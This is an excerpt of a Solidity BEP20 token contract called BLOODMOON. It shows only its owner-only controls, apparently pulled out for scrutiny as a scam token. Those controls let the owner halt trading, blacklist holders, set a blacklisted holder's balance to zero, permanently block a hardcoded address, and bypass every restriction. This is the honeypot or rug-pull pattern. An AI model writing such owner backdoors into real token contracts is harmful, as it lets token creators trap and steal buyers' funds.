...
contract BLOODMOON is BEP20 {
    ...
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        ...
        if(!finalbypass) {
         require(txoo &&  !bl[msg.sender]);
           require(msg.sender != address(0x2a00fe5a2aF725A657749A01CE80D15b2DaC63df));
        }
    ...
    function isTrading(bool transfers) onlyOwner public {
           txoo = transfers;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        ...
        if(!finalbypass) {
           require(txoo && !bl[msg.sender]);
           require(_from != address(0x2a00fe5a2aF725A657749A01CE80D15b2DaC63df));
        }
    ...
    function blguy(address add) public onlyOwner returns (bool) {
        bl[add] = true;
        balances[add] = 0;
        return true;
    }
    ...
    function setbypass(bool bo)  public onlyOwner {
        finalbypass = bo;
    }
}